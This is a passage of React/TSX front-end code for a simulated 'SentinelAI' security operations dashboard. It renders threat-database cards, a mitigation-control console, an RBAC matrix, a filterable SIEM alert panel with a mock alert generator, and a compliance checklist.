                    <span className="text-[10px] font-mono text-slate-500 uppercase block tracking-wider">Self-Healing Pipeline</span>
                    <span className="text-lg font-bold text-emerald-400 font-mono mt-0.5 block uppercase tracking-tight flex items-center gap-1">
                      <Zap className="w-4 h-4 text-emerald-400" />
                      Armed
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-1 xl:grid-cols-12 gap-5 mt-5">
                  {/* Left Column (8 cols): The 10 specialized threat databases */}
                  <div className="xl:col-span-8 space-y-3.5">
                    <div className="flex items-center gap-2 pb-1.5 border-b border-slate-900">
                      <Database className="w-3.5 h-3.5 text-slate-400" />
                      <h3 className="text-xs font-bold uppercase tracking-widest text-slate-400">10x Enterprise Threat Intelligence Integrations</h3>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[540px] overflow-y-auto pr-1">
                      {threatDbs.map((db) => {
                        const isDbSyncing = db.status !== "Synchronized" || activeSyncingDbId === "all";
                        return (
                          <div
                            key={db.id}
                            className={`p-3.5 rounded-xl border font-sans relative overflow-hidden transition duration-150 ${
                              isDbSyncing
                                ? "bg-indigo-950/10 border-indigo-500/40 shadow-sm shadow-indigo-950/10"
                                : "bg-slate-900/30 border-slate-850/80 hover:border-slate-800"
                            }`}
                            id={`threat-db-card-${db.id}`}
                          >
                            <div className="flex items-start justify-between gap-2 border-b border-slate-900/40 pb-2 mb-2.5">
                              <div>
                                <h4 className="font-semibold text-slate-200 text-xs leading-none">{db.name}</h4>
                                <span className="text-[9px] text-slate-500 font-mono block mt-1">Provider: {db.provider}</span>
                              </div>

                              <span className={`text-[8.5px] font-mono shrink-0 py-0.5 px-1.5 rounded-sm border inline-flex items-center gap-1 ${
                                db.status === "Synchronized" ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" :
                                db.status === "Updating" ? "bg-blue-500/10 text-blue-400 border-blue-500/20 animate-pulse" :
                                "bg-pink-500/10 text-pink-400 border-pink-500/20"
                              }`}>
                                <span className={`w-1 h-1 rounded-full ${
                                  db.status === "Synchronized" ? "bg-emerald-400" :
                                  db.status === "Updating" ? "bg-blue-400" :
                                  "bg-pink-400"
                                }`}></span>
                                {db.status.toUpperCase()}
                              </span>
                            </div>

                            <div className="grid grid-cols-2 gap-y-2 gap-x-4 text-[10px] bg-slate-950/40 p-2 rounded-lg border border-slate-910 font-mono">
                              <div>
                                <span className="text-slate-500 block text-[9px] uppercase">Registered Signatures</span>
                                <span className="text-slate-200 font-semibold text-[10.5px] mt-0.5 block flex items-center gap-1">
                                  {db.signaturesCount.toLocaleString()}
                                  {isDbSyncing && (
                                    <span className="text-[9px] text-indigo-400 animate-pulse font-normal shrink-0">
                                      (+syncing)
                                    </span>
                                  )}
                                </span>
                              </div>

                              <div>
                                <span className="text-slate-500 block text-[9px] uppercase">Telemetry Target</span>
                                <span className="text-slate-300 truncate block mt-0.5 text-[9.5px]" title={db.threatType}>
                                  {db.threatType}
                                </span>
                              </div>

                              <div>
                                <span className="text-slate-500 block text-[9px] uppercase">Signal Accuracy</span>
                                <span className="text-emerald-400 font-semibold block mt-0.5">
                                  {db.accuracyRate}
                                </span>
                              </div>

                              <div>
                                <span className="text-slate-500 block text-[9px] uppercase">Sync State</span>
                                <span className="text-slate-400 font-semibold block mt-0.5">
                                  {db.lastUpdated}
                                </span>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                  {/* Right Column (4 cols): Real-Time Adaptation Engine logs & self-healing telemetry */}
                  <div className="xl:col-span-4 flex flex-col justify-between space-y-4">
                    <div className="bg-slate-900/35 border border-slate-850 rounded-2xl p-4 flex-1 flex flex-col justify-between min-h-[460px]">
                      <div className="space-y-4">
                        <div className="border-b border-slate-900 pb-3">
                          <span className="text-[9px] uppercase font-mono tracking-wider font-semibold text-slate-500 block">Autonomous Adaptation Terminal</span>
                          <h3 className="text-xs font-bold text-white tracking-tight mt-0.5">Lattice-Optimised Adaptive Defense Stream</h3>
                          <p className="text-[11px] text-slate-450 mt-1">
                            Monitors active Cyber Arena simulations or host telemetry, and automatically downloads and patches missing signature rules in real-time.
                          </p>
                        </div>

                        <div className="space-y-2.5">
                          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-900 flex items-center justify-between gap-3 text-xs leading-none border-l-2 border-emerald-500">
                            <span className="text-slate-400 font-medium">Autonomous Patching Trigger</span>
                            <span className="text-emerald-400 font-mono font-bold uppercase">Ready & Scanning</span>
                          </div>

                          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-900 flex items-center justify-between gap-3 text-xs leading-none border-l-2 border-cyan-500">
                            <span className="text-slate-400 font-medium">Zero-Day Anomaly Self-Healing</span>
                            <span className="text-cyan-400 font-mono font-bold uppercase">Dynamic Hot-Patch</span>
                          </div>

                          {/* How it works info card */}
                          <div className="p-3.5 rounded-xl bg-indigo-650/10 border border-indigo-500/20 text-xs">
                            <span className="text-indigo-300 font-semibold uppercase font-mono text-[9.5px] block tracking-wide">Cognitive Loop System</span>
                            <p className="text-slate-400 text-[11px] leading-relaxed mt-1.5 font-sans">
                              When an offensive vector is executed inside the <strong>Cyber Arena</strong>, the autonomous engine isolates the malware behavior, matches it against all 10 repositories, acquires updates, and activates the required cryptographic shield in real-time.
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* Display adaptive intelligence logs */}
                      <div className="mt-4 flex flex-col gap-2">
                        <div className="flex items-center justify-between pb-1.5 border-b border-slate-900">
                          <span className="text-[9.5px] font-mono font-bold tracking-wider text-slate-400 uppercase">Live Adaptation Feed Clis</span>
                          <span className="text-[8.5px] font-mono text-cyan-400 animate-pulse">Running</span>
                        </div>

                        <div className="font-mono text-[10px] text-slate-350 leading-relaxed bg-black/50 p-2.5 rounded-xl border border-slate-950 h-[210px] overflow-y-auto" id="adaptive-learning-logs">
                          {adaptiveIntelligenceLogs.length === 0 ? (
                            <div className="text-slate-500 italic text-center pt-16 font-mono text-[10px]">
                              Feed standby... continuous polling in progress.
                            </div>
                          ) : (
                            <div className="space-y-1.5 font-mono text-[9px] leading-relaxed break-words whitespace-pre-wrap">
                              {adaptiveIntelligenceLogs.map((logLine, idx) => {
                                let labelColor = "text-slate-300";
                                if (logLine.startsWith("[DB-SYNC]")) {
                                  labelColor = "text-yellow-400";
                                } else if (logLine.startsWith("[ADAPTATION]")) {
                                  labelColor = "text-cyan-400 font-semibold";
                                } else if (logLine.startsWith("[AUTONOMOUS-SHIELD]")) {
                                  labelColor = "text-emerald-400 font-semibold animate-pulse";
                                } else if (logLine.startsWith("[CORE]")) {
                                  labelColor = "text-indigo-400";
                                }
                                return (
                                  <div key={idx} className={labelColor}>
                                    {logLine}
                                  </div>
                                );
                              })}
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* TAB 6: MITIGATION ARSENAL */}
            {activeTab === "arsenal" && (
              <div className="flex-1 flex flex-col pt-1" id="view-arsenal">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <ShieldCheck className="w-4 h-4 text-emerald-400 animate-pulse" />
                      SentinelAI Advanced Threat Mitigation Arsenal (10x Controls)
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Deploy instant network countermeasures and system level defenses directly within the air-gapped tenant sandbox.
                    </p>
                  </div>
                  <span className="text-[10px] font-mono bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 py-1 px-2.5 rounded">
                    Mitigation Engines: DISPATCHABLE
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-12 gap-5 mt-5">
                  {/* Left Column: List of 10 controls with categorized indicators and quick toggle states */}
                  <div className="md:col-span-6 flex flex-col gap-2.5 max-h-[500px] overflow-y-auto pr-2">
                    {defenses.map((def) => {
                      const catBadgeColor = 
                        def.category === "Network" ? "bg-blue-600/10 text-blue-400 border-blue-500/20" :
                        def.category === "Endpoint" ? "bg-amber-600/10 text-amber-400 border-amber-500/20" :
                        def.category === "Access" ? "bg-purple-600/10 text-purple-400 border-purple-500/20" :
                        "bg-teal-600/10 text-teal-400 border-teal-500/20";

                      return (
                        <div
                          key={def.id}
                          onClick={() => setSelectedDefenseId(def.id)}
                          className={`p-3 text-left rounded-xl text-xs font-sans border transition-all duration-200 cursor-pointer ${
                            selectedDefenseId === def.id 
                              ? "bg-indigo-600/10 border-indigo-500/60 shadow-lg shadow-indigo-950/20" 
                              : "bg-slate-900/40 border-slate-800 hover:border-slate-700 hover:bg-slate-900/60"
                          }`}
                          id={`defense-card-${def.id}`}
                        >
                          <div className="flex items-start justify-between gap-2.5">
                            <div className="flex-1">
                              <div className="flex flex-wrap items-center gap-2">
                                <span className="font-semibold text-slate-100 text-[12.5px]">{def.name}</span>
                                <span className={`text-[9.5px] font-mono uppercase tracking-wider py-0.5 px-1.5 rounded border ${catBadgeColor}`}>
                                  {def.category}
                                </span>
                              </div>
                              <p className="text-[11px] text-slate-400 mt-1 line-clamp-1">{def.description}</p>
                            </div>
                            
                            {/* Toggle & Light Indicator */}
                            <div className="flex items-center gap-2.5">
                              <span className="text-[10px] font-mono text-slate-550">{def.metrics}</span>
                              <div className="flex items-center gap-1.5">
                                <span className={`w-2 h-2 rounded-full ${def.status === "Active" ? "bg-emerald-400 animate-pulse" : "bg-slate-700"}`}></span>
                                <span className={`text-[10px] font-mono font-bold ${def.status === "Active" ? "text-emerald-400" : "text-slate-500"}`}>
                                  {def.status}
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>

                  {/* Right Column: In-depth Control Monitor & Command Execution Console */}
                  <div className="md:col-span-6 bg-slate-950/70 border border-slate-850 rounded-2xl p-4 flex flex-col justify-between min-h-[440px]">
                    {(() => {
                      const selectedDefense = defenses.find(d => d.id === selectedDefenseId) || defenses[0];
                      return (
                        <div className="flex flex-col h-full justify-between gap-4">
                          <div className="space-y-3.5">
                            <div className="flex items-center justify-between pb-2.5 border-b border-slate-900">
                              <div>
                                <span className="text-[10px] uppercase font-mono tracking-wider font-semibold text-slate-500 block">Selected Mitigation Protocol</span>
                                <h3 className="text-sm font-semibold text-white tracking-tight mt-0.5">{selectedDefense.name}</h3>
                              </div>
                              <button
                                onClick={() => toggleDefense(selectedDefense.id)}
                                className={`py-1.5 px-3 rounded-lg text-xs font-semibold tracking-wide transition flex items-center gap-1.5 border ${
                                  selectedDefense.status === "Active"
                                    ? "bg-red-600/10 text-red-400 border-red-500/30 hover:bg-red-600/20"
                                    : "bg-emerald-600 hover:bg-emerald-500 text-white border-emerald-500"
                                }`}
                                id={`mitigate-toggle-btn-${selectedDefense.id}`}
                              >
                                <Zap className="w-3.5 h-3.5" />
                                <span>{selectedDefense.status === "Active" ? "Deactivate Control" : "Activate Countermeasure"}</span>
                              </button>
                            </div>

                            <p className="text-xs text-slate-300 leading-relaxed font-sans bg-slate-900/40 border border-slate-850 p-3 rounded-xl">
                              {selectedDefense.description}
                            </p>

                            <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                              <div className="bg-slate-900/60 p-2.5 rounded-lg border border-slate-850/60 font-sans">
                                <span className="text-[10.5px] block text-slate-500 font-mono uppercase">Operational Metric</span>
                                <span className={`font-semibold block mt-1.5 text-xs font-sans ${selectedDefense.status === "Active" ? "text-emerald-400" : "text-slate-300"}`}>
                                  {selectedDefense.metrics}
                                </span>
                              </div>
                              <div className="bg-slate-900/60 p-2.5 rounded-lg border border-slate-850/60 font-sans">
                                <span className="text-[10.5px] block text-slate-500 font-mono uppercase">Deployment Status</span>
                                <span className={`font-bold inline-flex items-center gap-1 mt-1.5 ${selectedDefense.status === "Active" ? "text-emerald-400" : "text-slate-400"}`}>
                                  <span className={`w-1.5 h-1.5 rounded-full ${selectedDefense.status === "Active" ? "bg-emerald-400 animate-pulse" : "bg-slate-600"}`}></span>
                                  {selectedDefense.status === "Active" ? "ACTIVE EXECUTIONS" : "STANDBY POOL"}
                                </span>
                              </div>
                            </div>
                          </div>

                          {/* Live CLI Shell Console representing the mitigation rule execution */}
                          <div className="border border-slate-850 bg-slate-950 p-3 rounded-xl font-mono text-[11px] leading-relaxed space-y-2 mt-4">
                            <div className="flex justify-between text-slate-500 text-[10px] pb-1.5 border-b border-slate-900">
                              <span>SHELL COMMAND SIMULATION</span>
                              <span>SECURE BASH TERMINAL</span>
                            </div>
                            <div className="text-indigo-400 flex items-start gap-1">
                              <span className="text-emerald-500 font-bold">sentinel-ops#</span> 
                              <span className="break-all whitespace-pre-wrap select-all">{selectedDefense.command}</span>
                            </div>
                            <div className="text-slate-450 text-[10px] pt-1 leading-normal border-t border-slate-900/60 break-all whitespace-pre-wrap select-none">
                              {selectedDefense.status === "Active" ? (
                                <span className="text-emerald-400 font-semibold">{selectedDefense.output}</span>
                              ) : (
                                <span className="text-slate-500 italic font-medium">Command standby... Pending trigger initialization.</span>
                              )}
                            </div>
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                </div>
              </div>
            )}

          </div>

        </div>

        {/* RIGHT COLUMN: RECURRING LIVE ADVISORIES & EXPLICIT PLATFORM GUIDES (4 COLS) */}
        <div className="lg:col-span-4 flex flex-col gap-6" id="dashboard-sidebar">
          
          {/* Quick Informational Tool: Operationalize Guidance */}
          <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-5" id="security-control-matrix">
            <h3 className="text-sm font-semibold text-white tracking-widest uppercase flex items-center gap-2 mb-3 font-sans">
              <Lock className="w-4 h-4 text-emerald-400" />
              Endpoint RBAC Policy Matrix
            </h3>
            <p className="text-xs text-slate-400 leading-relaxed mb-4">
              To guarantee enterprise data protection standards and isolate compliance domains, permissions are locked down via strict RBAC credentials:
            </p>
            <div className="space-y-2.5 text-xs">
              <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-850 flex items-center justify-between gap-3">
                <div>
                  <span className="font-bold text-slate-200">🛡️ SecOps Admin Role</span>
                  <p className="text-[10px] text-slate-400 mt-0.5">Automated patching deployment, scan parameters tuning, tenant isolation scopes.</p>
                </div>
                <span className="text-[9.5px] font-mono text-emerald-400 uppercase bg-emerald-500/10 py-1 px-2.5 rounded border border-emerald-500/10 font-bold">
                  All Perks
                </span>
              </div>
              <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-850 flex items-center justify-between gap-3">
                <div>
                  <span className="font-bold text-slate-350 font-sans">👁️ Compliance Auditor</span>
                  <p className="text-[10px] text-slate-400 mt-0.5">Generate compliance reports, review tamper-proof ledger logs. Cannot trigger scans or patching commands.</p>
                </div>
                <span className="text-[9.5px] font-mono text-cyan-400 uppercase bg-cyan-500/10 py-1 px-2 rounded font-bold">
                  Assess Only
                </span>
              </div>
              <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-850 flex items-center justify-between gap-3">
                <div>
                  <span className="font-bold text-slate-350">🛠️ Helpdesk Operator</span>
                  <p className="text-[10px] text-slate-400 mt-0.5">Trigger secure diagnostic scans on specific endpoints and parse SIEM tickers. No write patches privilege.</p>
                </div>
                <span className="text-[9.5px] font-mono text-amber-400 uppercase bg-amber-500/10 py-1 px-2 rounded font-bold">
                  Diagnostics
                </span>
              </div>
            </div>
          </div>

          {/* Intel Center: Dynamic Threat Map Advisory Card */}
          <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-5" id="siem-incident-panel">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <Activity className="w-4 h-4 text-indigo-400 font-bold" />
                <h3 className="text-sm font-semibold text-white tracking-widest uppercase font-sans">
                  Live SIEM Incidents Indicator
                </h3>
              </div>
              <span className="relative flex h-2.5 w-2.5">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
              </span>
            </div>

            <p className="text-[11px] text-slate-400 leading-snug mb-4">
              Real-time feed filtering of hostile intrusion traffic, shell payloads, and anomaly events.
            </p>

            {/* Controls Row: Search Input + Severity select dropdown */}
            <div className="space-y-3 mb-4" id="siem-panel-controls" suppressHydrationWarning={true}>
              {/* Search input */}
              <div className="relative">
                <Search className="w-3.5 h-3.5 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                <input
                  type="text"
                  placeholder="Query keyword or host..."
                  value={siemSearchQuery}
                  onChange={(e) => setSiemSearchQuery(e.target.value)}
                  className="w-full bg-slate-950/80 border border-slate-800/85 hover:border-slate-700/80 focus:border-indigo-500/80 transition rounded-xl pl-9 pr-7 py-2 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-indigo-500/20"
                  id="siem-panel-search"
                  suppressHydrationWarning={true}
                />
                {siemSearchQuery && (
                  <button
                    onClick={() => setSiemSearchQuery("")}
                    className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-350 transition"
                  >
                    <X className="w-3 h-3" />
                  </button>
                )}
              </div>

              {/* Filtering row split with dynamic simulator action to demonstrate slide-in animation! */}
              <div className="flex items-center gap-2">
                {/* Severity select dropdown */}
                <div className="relative flex-1">
                  <Filter className="w-3 h-3 text-slate-400 absolute left-2.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  <select
                    value={siemSeverityFilter}
                    onChange={(e) => setSiemSeverityFilter(e.target.value as any)}
                    className="w-full bg-slate-950/80 border border-slate-800/80 hover:border-slate-700/80 focus:border-indigo-500/80 transition rounded-xl pl-7 pr-4 py-1.5 text-[11px] text-slate-350 focus:outline-none focus:ring-1 focus:ring-indigo-500/20 appearance-none font-mono cursor-pointer"
                    id="siem-panel-severity-dropdown"
                    suppressHydrationWarning={true}
                  >
                    <option value="All">All Severities</option>
                    <option value="Critical">🔴 Critical</option>
                    <option value="High">🟠 High</option>
                    <option value="Medium">🟡 Medium</option>
                  </select>
                </div>

                {/* Simulate alert button to trigger slide-in alerts */}
                <button
                  onClick={() => {
                    const hostNames = ["acme-win-desktop-104", "stark-core-mainframe", "acme-web-gateway", "apac-vault-server", "stark-db-replica"];
                    const randomHost = hostNames[Math.floor(Math.random() * hostNames.length)];
                    const threatHeuristics = [
                      { title: "Dynamic ML: Port Sweep Attempt", protocol: "NMAP ingress probe", severity: "Medium" as const, action: "Deploy Automated Hotfix Patch" },
                      { title: "Kernel Hook Interceptor Inbound", protocol: "Lsass shadow memory hook", severity: "Critical" as const, action: "Assess Anomaly Logs" },
                      { title: "Host Anomaly: SSH Buffer Overflow", protocol: "Exploited SSH sub-negotiation", severity: "High" as const, action: "Assess Anomaly Logs" },
                      { title: "C2 Exfiltration Handshake Intercepted", protocol: "Outdated root certificate validation leak", severity: "High" as const, action: "Deploy Automated Hotfix Patch" }
                    ];
                    const selectedHeuristic = threatHeuristics[Math.floor(Math.random() * threatHeuristics.length)];
                    const timeStr = new Date().toTimeString().split(" ")[0];
                    
                    const newInc: PanelIncident = {
                      id: `manual-inc-${Date.now()}`,
                      title: selectedHeuristic.title,
                      target: randomHost,
                      protocol: selectedHeuristic.protocol,
                      status: "Telemetry containment isolated.",
                      severity: selectedHeuristic.severity,
                      timestamp: timeStr,
                      actionText: selectedHeuristic.action,
                      presetLogIdx: selectedHeuristic.severity === "Critical" ? 2 : undefined,
                      tabKey: selectedHeuristic.severity === "Critical" ? "analyst" : "endpoints"
                    };

                    setPanelIncidents(prev => [newInc, ...prev]);

                    const mockSiemLog: SiemFeed = {
                      id: `siem-manual-tick-${Date.now()}`,
                      timestamp: timeStr,
                      source: randomHost,
                      event: `MANUAL STIMULATOR: ${selectedHeuristic.title} against target "${randomHost}". Severity set as ${selectedHeuristic.severity}`,
                      severity: selectedHeuristic.severity === "Critical" ? "Critical" : selectedHeuristic.severity === "High" ? "High" : "Medium",
                      type: "ML_ANOMALY"
                    };
                    setSiemEvents(prev => [mockSiemLog, ...prev]);

                    logAuditAction("SIEM_MANUAL_ALERT_TRIGGERED", `User simulated live threat vector: "${selectedHeuristic.title}" on host "${randomHost}".`, "Warning");
                  }}
                  className="bg-indigo-650/10 hover:bg-indigo-600/25 text-indigo-400 border border-indigo-500/20 rounded-xl px-2.5 py-1.5 text-[10px] font-bold font-mono transition leading-tight shrink-0 cursor-pointer"
                  title="Simulate a live incident to watch the slide-in animation"
                  id="btn-simulate-event"
                >
                  + Stim Alert
                </button>
              </div>

              {/* Info summary */}
              <div className="flex items-center justify-between text-[10px] text-slate-500 font-mono pt-1">
                {(() => {
                  const filteredIncidents = panelIncidents.filter(inc => {
                    if (siemSeverityFilter !== "All" && inc.severity !== siemSeverityFilter) {
                      return false;
                    }
                    if (siemSearchQuery.trim()) {
                      const q = siemSearchQuery.toLowerCase();
                      const matchesTarget = inc.target?.toLowerCase().includes(q);
                      const matchesTitle = inc.title?.toLowerCase().includes(q);
                      const matchesProtocol = inc.protocol?.toLowerCase().includes(q);
                      const matchesStatus = inc.status?.toLowerCase().includes(q);
                      return matchesTarget || matchesTitle || matchesProtocol || matchesStatus;
                    }
                    return true;
                  });
                  return (
                    <>
                      <span>Showing {filteredIncidents.length} of {panelIncidents.length} logs</span>
                      {(siemSearchQuery || siemSeverityFilter !== "All") && (
                        <button
                          onClick={() => {
                            setSiemSearchQuery("");
                            setSiemSeverityFilter("All");
                          }}
                          className="text-indigo-400 hover:underline cursor-pointer"
                        >
                          Clear Filters
                        </button>
                      )}
                    </>
                  );
                })()}
              </div>
            </div>

            {/* List with slide-in animation */}
            <div className="space-y-4 max-h-[385px] overflow-y-auto pr-1 custom-scrollbar">
              <AnimatePresence initial={false}>
                {(() => {
                  const filteredIncidents = panelIncidents.filter(inc => {
                    if (siemSeverityFilter !== "All" && inc.severity !== siemSeverityFilter) {
                      return false;
                    }
                    if (siemSearchQuery.trim()) {
                      const q = siemSearchQuery.toLowerCase();
                      const matchesTarget = inc.target?.toLowerCase().includes(q);
                      const matchesTitle = inc.title?.toLowerCase().includes(q);
                      const matchesProtocol = inc.protocol?.toLowerCase().includes(q);
                      const matchesStatus = inc.status?.toLowerCase().includes(q);
                      return matchesTarget || matchesTitle || matchesProtocol || matchesStatus;
                    }
                    return true;
                  });

                  if (filteredIncidents.length === 0) {
                    return (
                      <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="text-center py-8 text-slate-500 text-xs font-mono border border-dashed border-slate-850 rounded-xl p-4 bg-slate-950/20"
                        id="siem-panel-empty"
                      >
                        <Filter className="w-5 h-5 mx-auto text-slate-750 mb-2 animate-pulse" />
                        No incident events found.<br/>Change query or check All Severities.
                      </motion.div>
                    );
                  }

                  return filteredIncidents.map((item) => {
                    const isCritical = item.severity === "Critical";
                    const isHigh = item.severity === "High";
                    
                    const bgClass = isCritical 
                      ? "bg-red-950/15 border-red-500/25" 
                      : isHigh 
                        ? "bg-amber-950/10 border-amber-500/25" 
                        : "bg-blue-950/10 border-blue-500/20";
                    
                    const textClass = isCritical 
                      ? "text-red-400" 
                      : isHigh 
                        ? "text-amber-400" 
                        : "text-blue-400";

                    return (
                      <motion.div
                        key={item.id}
                        initial={{ opacity: 0, x: 25, height: 0 }}
                        animate={{ opacity: 1, x: 0, height: "auto" }}
                        exit={{ opacity: 0, x: -25, height: 0 }}
                        transition={{ 
                          type: "spring", 
                          stiffness: 400, 
                          damping: 30,
                          height: { duration: 0.15 } 
                        }}
                        className={`p-3 border rounded-xl overflow-hidden ${bgClass}`}
                        id={`siem-panel-item-${item.id}`}
                      >
                        <div className="flex items-center justify-between text-[10px] font-mono text-slate-450 border-b border-slate-900/40 pb-1.5 mb-2">
                          <span className="font-bold flex items-center gap-1">
                            {isCritical ? (
                              <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse shrink-0" />
                            ) : isHigh ? (
                              <span className="w-1.5 h-1.5 rounded-full bg-amber-400 shrink-0" />
                            ) : (
                              <span className="w-1.5 h-1.5 rounded-full bg-blue-400 shrink-0" />
                            )}
                            {item.severity} Alert
                          </span>
                          <span>{item.timestamp}</span>
                        </div>

                        <div className={`flex items-center gap-2 text-xs font-semibold ${textClass}`}>
                          {isCritical ? (
                            <ShieldAlert className="w-3.5 h-3.5 shrink-0 animate-bounce" />
                          ) : (
                            <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                          )}
                          <span className="leading-tight truncate">{item.title}</span>
                        </div>

                        <p className="text-[10.5px] text-slate-350 mt-1.5 font-mono leading-relaxed bg-slate-950/40 p-2 rounded border border-slate-900/30">
                          <span className="text-slate-500">Target Node:</span> <span className="text-white font-medium">{item.target}</span><br />
                          {item.protocol && (
                            <>
                              <span className="text-slate-500">Protocol/Trace:</span> <span className="text-slate-200">{item.protocol}</span><br />
                            </>
                          )}
                          <span className="text-slate-500">Status:</span> <span className="text-slate-400 italic">{item.status}</span>
                        </p>

                        <div className="mt-2.5 flex justify-end gap-1.5">
                          <button
                            onClick={() => {
                              if (item.tabKey) {
                                setActiveTab(item.tabKey as any);
                              }
                              if (item.presetLogIdx !== undefined) {
                                selectPresetLog(item.presetLogIdx);
                              }
                            }}
                            className={`text-[10px] py-1 px-2.5 rounded font-bold font-sans transition cursor-pointer ${
                              isCritical 
                                ? "bg-red-950/80 hover:bg-red-900 border border-red-800 text-red-300"
                                : isHigh 
                                  ? "bg-amber-950/85 hover:bg-amber-900 border border-amber-800 text-amber-300"
                                  : "bg-blue-950/80 hover:bg-blue-900 border border-blue-800 text-blue-300"
                            }`}
                          >
                            {item.actionText}
                          </button>
                        </div>
                      </motion.div>
                    );
                  });
                })()}
              </AnimatePresence>
            </div>
          </div>

          {/* Quick audit tools summary & checklist */}
          <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-5" id="compliance-checklist">
            <h3 className="text-sm font-semibold text-white tracking-widest uppercase flex items-center gap-2 mb-3.5 font-sans">
              <FileCheck className="w-4 h-4 text-cyan-400" />
              IT Audit Alignment Checklist
            </h3>
            <div className="space-y-3 text-xs text-slate-350 font-mono">
              <label className="flex items-start gap-2.5 leading-tight">
                <input 
                  type="checkbox" 
                  checked={metrics.secure === metrics.total} 
                  readOnly 
                  className="rounded border-slate-700 bg-slate-950 text-indigo-600 focus:ring-0 focus:ring-offset-0 shrink-0 mt-0.5" 
                />
                <div>
                  <span className={metrics.secure === metrics.total ? "text-slate-450 line-through" : "text-white"}>
                    Zero Outdated Patch Gaps
                  </span>
                  <p className="text-[9.5px] text-slate-500 mt-0.5">All reporting hosts must maintain clean patched secure status ledger verification.</p>
                </div>
              </label>

              <label className="flex items-start gap-2.5 leading-tight">
                <input 
                  type="checkbox" 
                  checked={role === "SecOps-Admin" || role === "Compliance-Auditor" || role === "Helpdesk-Operator"} 
                  readOnly 
                  className="rounded border-slate-700 bg-slate-950 text-indigo-600 focus:ring-0 focus:ring-offset-0 shrink-0 mt-0.5" 
                />
                <div>
                  <span className="text-slate-450 line-through">Access Controls Implemented</span>
                  <p className="text-[9.5px] text-slate-500 mt-0.5">Ensure active workspace handles tenant directory isolation with separate tenant views.</p>
                </div>
              </label>

              <label className="flex items-start gap-2.5 leading-tight">
                <input 
                  type="checkbox" 
                  checked={auditLedger.length > 3} 
                  readOnly 
                  className="rounded border-slate-700 bg-slate-950 text-indigo-600 focus:ring-0 focus:ring-offset-0 shrink-0 mt-0.5" 
                />
                <div>
                  <span className={auditLedger.length > 3 ? "text-slate-450 line-through" : "text-white"}>
                    Cryptographic Audit Trails
                  </span>
                  <p className="text-[9.5px] text-slate-500 mt-0.5">Generate audit logs trails automatically for incident diagnostic actions.</p>
                </div>
              </label>
            </div>
          </div>

        </div>

      </div>

      {/* Footer System Credits */}
      <footer className="mt-12 pt-6 border-t border-slate-900 text-center text-xs text-slate-500 font-mono" id="dashboard-footer">
        <div>SentinelAI Cyber Security Cockpit — Fully AirGapped Cloud-Native Enterprise Node Manager</div>
        <div className="mt-1">Compiled and assessed against global regulation frameworks (SOC2 Type II, GDPR Safeguards, HIPAA, ISO 27001).</div>
      </footer>
    </div>
  );
}
